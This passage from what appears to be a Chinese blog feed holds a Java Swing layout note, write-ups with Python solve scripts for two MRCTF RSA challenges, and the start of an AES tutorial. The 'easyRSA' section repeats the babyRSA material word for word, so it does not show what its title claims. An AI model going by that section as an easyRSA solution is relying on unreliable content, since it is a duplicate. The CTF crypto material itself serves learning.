JPanel()</code>,然后把按钮添加到这个面板上，再把这个面板添加到JFrame（真正的内容面板）就可以了</p><h2 id="默认布局"><a href="#默认布局" class="headerlink" title="默认布局"></a>默认布局</h2><p>jframe默认是边界布局,同一个位置放入组件,那么后面的组件覆盖前面的组件（BorderLayout）<br>JPanel的默认布局为流式布局 ,所以就是一个靠近一个的出来（FlowLayout）<br>这里new出来的JPanel是流式布局，所以不会覆盖</p><h3 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h3><p><img src="https://upload-images.jianshu.io/upload_images/19601162-d400bd536c3eb5f7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2020-02-25 (4).png"></p><p>如果我非要用<code>j1=(JPanel)this.getContentPane();</code>获取内容面板，然后<code>j1.add(bt1,BorderLayout.SOUTH);</code> <code>j1.add(bt2,BorderLayout.SOUTH);</code>为什么同时添加的两个南方的按钮会有一个被覆盖呢，明明JPanel是流式的…<br><strong>内容面板的默认布局管理器是边界式的，普通面板是流式的</strong><br>经过答疑了解到，<strong>强制类型转换改变不了内容面板的布局管理器，只是可以赋值给JPanel对象了</strong><br>当然题目说的是放置一个面板，如果像我这样做，等于直接在内容面板的南方放了两个按钮，虽然看着没什么不同，但感觉还是有实质上的区别</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>两道RSA[MRCTF]</title>
    <link href="/2020/05/05/MRCTF%20WP/"/>
    <url>/2020/05/05/MRCTF%20WP/</url>
    
    <content type="html"><![CDATA[<p>MRCTF的两道RSA</p><a id="more"></a><h2 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd, invert</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, isPrime, getRandomNBitInteger, bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b"MRCTF&#123;xxxx&#125;"</span></span><br><span class="line">base = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCD</span><span class="params">(A)</span>:</span></span><br><span class="line">    B = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(A)):</span><br><span class="line">        B = gcd(A[i<span class="number">-1</span>], A[i])</span><br><span class="line">    <span class="keyword">return</span> B</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_p</span><span class="params">()</span>:</span></span><br><span class="line">    P = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">17</span>)]</span><br><span class="line">    P[<span class="number">0</span>] = getPrime(<span class="number">128</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">17</span>):</span><br><span class="line">        P[i] = sympy.nextprime(P[i<span class="number">-1</span>])</span><br><span class="line">    print(<span class="string">"P_p :"</span>, P[<span class="number">9</span>])</span><br><span class="line">    n = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">17</span>):</span><br><span class="line">        n *= P[i]</span><br><span class="line">    p = getPrime(<span class="number">1024</span>)</span><br><span class="line">    factor = pow(p, base, n)</span><br><span class="line">    print(<span class="string">"P_factor :"</span>, factor)</span><br><span class="line">    <span class="keyword">return</span> sympy.nextprime(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_q</span><span class="params">()</span>:</span></span><br><span class="line">    sub_Q = getPrime(<span class="number">1024</span>)</span><br><span class="line">    Q_1 = getPrime(<span class="number">1024</span>)</span><br><span class="line">    Q_2 = getPrime(<span class="number">1024</span>)</span><br><span class="line">    Q = sub_Q ** Q_2 % Q_1</span><br><span class="line">    print(<span class="string">"Q_1: "</span>, Q_1)</span><br><span class="line">    print(<span class="string">"Q_2: "</span>, Q_2)</span><br><span class="line">    print(<span class="string">"sub_Q: "</span>, sub_Q)</span><br><span class="line">    <span class="keyword">return</span> sympy.nextprime(Q)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    _E = base</span><br><span class="line">    _P = gen_p()</span><br><span class="line">    _Q = gen_q()</span><br><span class="line">    <span class="keyword">assert</span> (gcd(_E, (_P - <span class="number">1</span>) * (_Q - <span class="number">1</span>)) == <span class="number">1</span>)</span><br><span class="line">    _M = bytes_to_long(flag)</span><br><span class="line">    _C = pow(_M, _E, _P * _Q)</span><br><span class="line">    print(<span class="string">"Ciphertext = "</span>, _C)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">P_p : 206027926847308612719677572554991143421</span></span><br><span class="line"><span class="string">P_factor : 213671742765908980787116579976289600595864704574134469173111790965233629909513884704158446946409910475727584342641848597858942209151114627306286393390259700239698869487469080881267182803062488043469138252786381822646126962323295676431679988602406971858136496624861228526070581338082202663895710929460596143281673761666804565161435963957655012011051936180536581488499059517946308650135300428672486819645279969693519039407892941672784362868653243632727928279698588177694171797254644864554162848696210763681197279758130811723700154618280764123396312330032986093579531909363210692564988076206283296967165522152288770019720928264542910922693728918198338839</span></span><br><span class="line"><span class="string">Q_1:  103766439849465588084625049495793857634556517064563488433148224524638105971161051763127718438062862548184814747601299494052813662851459740127499557785398714481909461631996020048315790167967699932967974484481209879664173009585231469785141628982021847883945871201430155071257803163523612863113967495969578605521</span></span><br><span class="line"><span class="string">Q_2:  151010734276916939790591461278981486442548035032350797306496105136358723586953123484087860176438629843688462671681777513652947555325607414858514566053513243083627810686084890261120641161987614435114887565491866120507844566210561620503961205851409386041194326728437073995372322433035153519757017396063066469743</span></span><br><span class="line"><span class="string">sub_Q:  168992529793593315757895995101430241994953638330919314800130536809801824971112039572562389449584350643924391984800978193707795909956472992631004290479273525116959461856227262232600089176950810729475058260332177626961286009876630340945093629959302803189668904123890991069113826241497783666995751391361028949651</span></span><br><span class="line"><span class="string">Ciphertext =  1709187240516367141460862187749451047644094885791761673574674330840842792189795049968394122216854491757922647656430908587059997070488674220330847871811836724541907666983042376216411561826640060734307013458794925025684062804589439843027290282034999617915124231838524593607080377300985152179828199569474241678651559771763395596697140206072537688129790126472053987391538280007082203006348029125729650207661362371936196789562658458778312533505938858959644541233578654340925901963957980047639114170033936570060250438906130591377904182111622236567507022711176457301476543461600524993045300728432815672077399879668276471832</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>gen_q()中sub_Q,Q_1,Q_2都已给出，唯一注意的一点是<code>Q = sub_Q ** Q_2 % Q_1</code>,大数乘方计算量太大，应该改为模运算<code>Q=pow(sub_ Q,Q_2,Q_1)</code><br>gen_p()给出第十个素数，使用sympy.nextprime()和sympy.prevprime()向前向后推就行，由于n由17个小素数相乘得到，对应的φ(n)分别用小素数-1相乘得到，然后进行一次普通的RSA，得到P</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line">C=  <span class="number">1709187240516367141460862187749451047644094885791761673574674330840842792189795049968394122216854491757922647656430908587059997070488674220330847871811836724541907666983042376216411561826640060734307013458794925025684062804589439843027290282034999617915124231838524593607080377300985152179828199569474241678651559771763395596697140206072537688129790126472053987391538280007082203006348029125729650207661362371936196789562658458778312533505938858959644541233578654340925901963957980047639114170033936570060250438906130591377904182111622236567507022711176457301476543461600524993045300728432815672077399879668276471832</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_q</span><span class="params">()</span>:</span></span><br><span class="line">    Q_1=<span class="number">103766439849465588084625049495793857634556517064563488433148224524638105971161051763127718438062862548184814747601299494052813662851459740127499557785398714481909461631996020048315790167967699932967974484481209879664173009585231469785141628982021847883945871201430155071257803163523612863113967495969578605521</span></span><br><span class="line">    Q_2=<span class="number">151010734276916939790591461278981486442548035032350797306496105136358723586953123484087860176438629843688462671681777513652947555325607414858514566053513243083627810686084890261120641161987614435114887565491866120507844566210561620503961205851409386041194326728437073995372322433035153519757017396063066469743</span></span><br><span class="line">    sub_Q=<span class="number">168992529793593315757895995101430241994953638330919314800130536809801824971112039572562389449584350643924391984800978193707795909956472992631004290479273525116959461856227262232600089176950810729475058260332177626961286009876630340945093629959302803189668904123890991069113826241497783666995751391361028949651</span></span><br><span class="line">    Q =pow(sub_Q,Q_2,Q_1)</span><br><span class="line">    <span class="keyword">return</span> sympy.nextprime(Q)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_p</span><span class="params">()</span>:</span></span><br><span class="line">    n=<span class="number">1</span></span><br><span class="line">    phin=<span class="number">1</span></span><br><span class="line">    P=[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">17</span>)]</span><br><span class="line">    P[<span class="number">9</span>]=<span class="number">206027926847308612719677572554991143421</span></span><br><span class="line">    P_factor =<span class="number">213671742765908980787116579976289600595864704574134469173111790965233629909513884704158446946409910475727584342641848597858942209151114627306286393390259700239698869487469080881267182803062488043469138252786381822646126962323295676431679988602406971858136496624861228526070581338082202663895710929460596143281673761666804565161435963957655012011051936180536581488499059517946308650135300428672486819645279969693519039407892941672784362868653243632727928279698588177694171797254644864554162848696210763681197279758130811723700154618280764123396312330032986093579531909363210692564988076206283296967165522152288770019720928264542910922693728918198338839</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">        P[i]=sympy.prevprime(P[i+<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>,<span class="number">17</span>):</span><br><span class="line">        P[i]=sympy.nextprime(P[i<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">17</span>):</span><br><span class="line">        n*=P[i]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">17</span>):</span><br><span class="line">        phin*=P[i]<span class="number">-1</span></span><br><span class="line">    d=invert(<span class="number">65537</span>,phin)</span><br><span class="line">    p=pow(P_factor,d,n)</span><br><span class="line">    <span class="keyword">return</span> sympy.nextprime(p)</span><br><span class="line">P=gen_p()</span><br><span class="line">Q=gen_q()</span><br><span class="line">D=invert(<span class="number">65537</span>,(P<span class="number">-1</span>)*(Q<span class="number">-1</span>))</span><br><span class="line">M=pow(C,D,P*Q)</span><br><span class="line">print(long_to_bytes(M))</span><br></pre></td></tr></table></figure><h2 id="easyRSA"><a href="#easyRSA" class="headerlink" title="easyRSA"></a>easyRSA</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd, invert</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, isPrime, getRandomNBitInteger, bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b"MRCTF&#123;xxxx&#125;"</span></span><br><span class="line">base = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCD</span><span class="params">(A)</span>:</span></span><br><span class="line">    B = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(A)):</span><br><span class="line">        B = gcd(A[i<span class="number">-1</span>], A[i])</span><br><span class="line">    <span class="keyword">return</span> B</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_p</span><span class="params">()</span>:</span></span><br><span class="line">    P = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">17</span>)]</span><br><span class="line">    P[<span class="number">0</span>] = getPrime(<span class="number">128</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">17</span>):</span><br><span class="line">        P[i] = sympy.nextprime(P[i<span class="number">-1</span>])</span><br><span class="line">    print(<span class="string">"P_p :"</span>, P[<span class="number">9</span>])</span><br><span class="line">    n = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">17</span>):</span><br><span class="line">        n *= P[i]</span><br><span class="line">    p = getPrime(<span class="number">1024</span>)</span><br><span class="line">    factor = pow(p, base, n)</span><br><span class="line">    print(<span class="string">"P_factor :"</span>, factor)</span><br><span class="line">    <span class="keyword">return</span> sympy.nextprime(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_q</span><span class="params">()</span>:</span></span><br><span class="line">    sub_Q = getPrime(<span class="number">1024</span>)</span><br><span class="line">    Q_1 = getPrime(<span class="number">1024</span>)</span><br><span class="line">    Q_2 = getPrime(<span class="number">1024</span>)</span><br><span class="line">    Q = sub_Q ** Q_2 % Q_1</span><br><span class="line">    print(<span class="string">"Q_1: "</span>, Q_1)</span><br><span class="line">    print(<span class="string">"Q_2: "</span>, Q_2)</span><br><span class="line">    print(<span class="string">"sub_Q: "</span>, sub_Q)</span><br><span class="line">    <span class="keyword">return</span> sympy.nextprime(Q)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    _E = base</span><br><span class="line">    _P = gen_p()</span><br><span class="line">    _Q = gen_q()</span><br><span class="line">    <span class="keyword">assert</span> (gcd(_E, (_P - <span class="number">1</span>) * (_Q - <span class="number">1</span>)) == <span class="number">1</span>)</span><br><span class="line">    _M = bytes_to_long(flag)</span><br><span class="line">    _C = pow(_M, _E, _P * _Q)</span><br><span class="line">    print(<span class="string">"Ciphertext = "</span>, _C)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">P_p : 206027926847308612719677572554991143421</span></span><br><span class="line"><span class="string">P_factor : 213671742765908980787116579976289600595864704574134469173111790965233629909513884704158446946409910475727584342641848597858942209151114627306286393390259700239698869487469080881267182803062488043469138252786381822646126962323295676431679988602406971858136496624861228526070581338082202663895710929460596143281673761666804565161435963957655012011051936180536581488499059517946308650135300428672486819645279969693519039407892941672784362868653243632727928279698588177694171797254644864554162848696210763681197279758130811723700154618280764123396312330032986093579531909363210692564988076206283296967165522152288770019720928264542910922693728918198338839</span></span><br><span class="line"><span class="string">Q_1:  103766439849465588084625049495793857634556517064563488433148224524638105971161051763127718438062862548184814747601299494052813662851459740127499557785398714481909461631996020048315790167967699932967974484481209879664173009585231469785141628982021847883945871201430155071257803163523612863113967495969578605521</span></span><br><span class="line"><span class="string">Q_2:  151010734276916939790591461278981486442548035032350797306496105136358723586953123484087860176438629843688462671681777513652947555325607414858514566053513243083627810686084890261120641161987614435114887565491866120507844566210561620503961205851409386041194326728437073995372322433035153519757017396063066469743</span></span><br><span class="line"><span class="string">sub_Q:  168992529793593315757895995101430241994953638330919314800130536809801824971112039572562389449584350643924391984800978193707795909956472992631004290479273525116959461856227262232600089176950810729475058260332177626961286009876630340945093629959302803189668904123890991069113826241497783666995751391361028949651</span></span><br><span class="line"><span class="string">Ciphertext =  1709187240516367141460862187749451047644094885791761673574674330840842792189795049968394122216854491757922647656430908587059997070488674220330847871811836724541907666983042376216411561826640060734307013458794925025684062804589439843027290282034999617915124231838524593607080377300985152179828199569474241678651559771763395596697140206072537688129790126472053987391538280007082203006348029125729650207661362371936196789562658458778312533505938858959644541233578654340925901963957980047639114170033936570060250438906130591377904182111622236567507022711176457301476543461600524993045300728432815672077399879668276471832</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>gen_q()中sub_Q,Q_1,Q_2都已给出，唯一注意的一点是<code>Q = sub_Q ** Q_2 % Q_1</code>,大数乘方计算量太大，应该改为模运算<code>Q=pow(sub_ Q,Q_2,Q_1)</code><br>gen_p()给出第十个素数，使用sympy.nextprime()和sympy.prevprime()向前向后推就行，由于n由17个小素数相乘得到，对应的φ(n)分别用小素数-1相乘得到，然后进行一次普通的RSA，得到P</p><h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line">C=  <span class="number">1709187240516367141460862187749451047644094885791761673574674330840842792189795049968394122216854491757922647656430908587059997070488674220330847871811836724541907666983042376216411561826640060734307013458794925025684062804589439843027290282034999617915124231838524593607080377300985152179828199569474241678651559771763395596697140206072537688129790126472053987391538280007082203006348029125729650207661362371936196789562658458778312533505938858959644541233578654340925901963957980047639114170033936570060250438906130591377904182111622236567507022711176457301476543461600524993045300728432815672077399879668276471832</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_q</span><span class="params">()</span>:</span></span><br><span class="line">    Q_1=<span class="number">103766439849465588084625049495793857634556517064563488433148224524638105971161051763127718438062862548184814747601299494052813662851459740127499557785398714481909461631996020048315790167967699932967974484481209879664173009585231469785141628982021847883945871201430155071257803163523612863113967495969578605521</span></span><br><span class="line">    Q_2=<span class="number">151010734276916939790591461278981486442548035032350797306496105136358723586953123484087860176438629843688462671681777513652947555325607414858514566053513243083627810686084890261120641161987614435114887565491866120507844566210561620503961205851409386041194326728437073995372322433035153519757017396063066469743</span></span><br><span class="line">    sub_Q=<span class="number">168992529793593315757895995101430241994953638330919314800130536809801824971112039572562389449584350643924391984800978193707795909956472992631004290479273525116959461856227262232600089176950810729475058260332177626961286009876630340945093629959302803189668904123890991069113826241497783666995751391361028949651</span></span><br><span class="line">    Q =pow(sub_Q,Q_2,Q_1)</span><br><span class="line">    <span class="keyword">return</span> sympy.nextprime(Q)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_p</span><span class="params">()</span>:</span></span><br><span class="line">    n=<span class="number">1</span></span><br><span class="line">    phin=<span class="number">1</span></span><br><span class="line">    P=[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">17</span>)]</span><br><span class="line">    P[<span class="number">9</span>]=<span class="number">206027926847308612719677572554991143421</span></span><br><span class="line">    P_factor =<span class="number">213671742765908980787116579976289600595864704574134469173111790965233629909513884704158446946409910475727584342641848597858942209151114627306286393390259700239698869487469080881267182803062488043469138252786381822646126962323295676431679988602406971858136496624861228526070581338082202663895710929460596143281673761666804565161435963957655012011051936180536581488499059517946308650135300428672486819645279969693519039407892941672784362868653243632727928279698588177694171797254644864554162848696210763681197279758130811723700154618280764123396312330032986093579531909363210692564988076206283296967165522152288770019720928264542910922693728918198338839</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">        P[i]=sympy.prevprime(P[i+<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>,<span class="number">17</span>):</span><br><span class="line">        P[i]=sympy.nextprime(P[i<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">17</span>):</span><br><span class="line">        n*=P[i]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">17</span>):</span><br><span class="line">        phin*=P[i]<span class="number">-1</span></span><br><span class="line">    d=invert(<span class="number">65537</span>,phin)</span><br><span class="line">    p=pow(P_factor,d,n)</span><br><span class="line">    <span class="keyword">return</span> sympy.nextprime(p)</span><br><span class="line">P=gen_p()</span><br><span class="line">Q=gen_q()</span><br><span class="line">D=invert(<span class="number">65537</span>,(P<span class="number">-1</span>)*(Q<span class="number">-1</span>))</span><br><span class="line">M=pow(C,D,P*Q)</span><br><span class="line">print(long_to_bytes(M))</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>crypto刷题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RSA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AES加密解密</title>
    <link href="/2020/05/05/AES/"/>
    <url>/2020/05/05/AES/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><p>对称加密算法AES的学习</p><a id="more"></a><p>学习来源：<a href="https://blog.csdn.net/gulang03/article/details/81175854" target="_blank" rel="noopener">https://blog.csdn.net/gulang03/article/details/81175854</a></p><p>所有图片来源<a href="https://blog.csdn.net/gulang03/article/details/81175854" target="_blank" rel="noopener">https://blog.csdn.net/gulang03/article/details/81175854</a></p><h2 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h2><p>高级加密标准(AES,Advanced Encryption Standard)为最常见的对称加密算法。<br>下面分析一下AES-128的加密过程<br>128即密钥为128位，进行10轮加密，密钥位数不同，加密轮数也不同。</p><h3 id="轮密钥加"><a href="#轮密钥加" class="headerlink" title="轮密钥加"></a>轮密钥加</h3><p><img src="https://upload-images.jianshu.io/upload_images/19601162-a400b0cd5249d2dc.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="20170219152638324.jpg"><br>图中的W[0],W[1],W[2],W[3]是原始密钥，一列如k0,k1,k2,k3(每个key8位)组成W[0]   (32位字)<br>轮密钥加是将128位轮密钥Ki同状态矩阵(一般地，明文分组用字节为单位的正方形矩阵描述，称为状态矩阵。)中的数据进行逐位异或操作。<br>明文矩阵与状态矩阵的转换：<br><img src="https://upload-images.jianshu.io/upload_images/19601162-8cebeb0a38a431e8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="20170219134722812.png"><br>轮密钥加图解：<br><img src="https://upload-images.jianshu.io/upload_images/19601162-75b295e3c76fb9f8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="20170220080512086.png"><br>可以看做是S0,S1,S2,S3组成的32位字与W[0]的异或运算</p><h3 id="轮函数"><a href="#轮函数" class="headerlink" title="轮函数"></a>轮函数</h3><p>前九轮分为字节代换，行移位，列混合三步，第10轮没有列混合</p><h4 id="字节代换"><a href="#字节代换" class="headerlink" title="字节代换"></a>字节代换</h4><p>根据给出的S盒代换表进行代换<br>将一个字节前四位看作行数，后四位看作列数，找到对应的数字进行代换</p><h4 id="行移位"><a href="#行移位" class="headerlink" title="行移位"></a>行移位</h4><p>当密钥长度为128比特时，状态矩阵的第0行左移0字节，第1行左移1字节，第2行左移2字节，第3行左移3字节。<br><img src="https://upload-images.jianshu.io/upload_images/19601162-0e8dbda1dbaaa861.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="20170219174015167.png"></p><h4 id="列混合"><a href="#列混合" class="headerlink" title="列混合"></a>列混合</h4><p>列混合需要将状态矩阵与固定的矩阵相乘，此处相乘是基于GF(2^8)上的二元运算,并不是通常意义上的乘法和加法。虽然关于有限域的运算我不会，但是这好像不影响我们理解此处的运算<br><img src="https://upload-images.jianshu.io/upload_images/19601162-9a34cb6c3dfcc89f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="20170219203346436.png"><br>等号右侧左边的矩阵就是固定矩阵，矩阵的相乘究竟是如何运算的呢<br>状态矩阵中的第j列(0 ≤j≤3)的列混合可以表示为下图所示：<br><img src="https://upload-images.jianshu.io/upload_images/19601162-a4141904f538b9e7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="20170219203742516.png"><br>从图中可知列混合的新矩阵的第一行第j列元素是固定矩阵中第一行元素与原矩阵第j列元素对应相乘并异或</p><h3 id="轮密钥的生成"><a href="#轮密钥的生成" class="headerlink" title="轮密钥的生成"></a>轮密钥的生成</h3><p><img src="https://upload-images.jianshu.io/upload_images/19601162-86e8000fe89d204a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="20170220082316736.png"><br>有了初始密钥W[0],W[1],W[2],W[3]hou,后面密钥的生成都基于这个规则<br>其中的T函数又分为三步：字循环，字节代换，轮常量异或</p><h4 id="字循环"><a href="#字循环" class="headerlink" title="字循环"></a>字循环</h4><p>将1个字中的4个字节循环左移1个字节。即将输入字[b0, b1, b2, b3]变换成[b1,b2,b3,b0]</p><h4 id="字节代换-1"><a href="#字节代换-1" class="headerlink" title="字节代换"></a>字节代换</h4><p>使用S盒代换</p><h4 id="轮常量异或"><a href="#轮常量异或" class="headerlink" title="轮常量异或"></a>轮常量异或</h4><p><img 